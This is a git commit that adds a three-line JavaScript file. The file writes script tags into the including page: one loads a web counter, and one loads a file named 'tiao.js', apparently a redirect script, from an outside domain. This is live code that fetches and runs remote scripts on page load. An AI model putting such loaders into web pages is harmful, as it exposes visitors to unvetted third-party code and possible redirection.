1880236e4ba39579200344b9b19d595278c43af2
sadasd12 <sadasd12@outlook.com>
2015-09-02 08:10:26 +0800

    Create fcm.js

---
+++ w2w2/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count1.51yes.com\/click.aspx?id=19505259&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.t171.com\/w2w2/tiao.js ><\/script>");
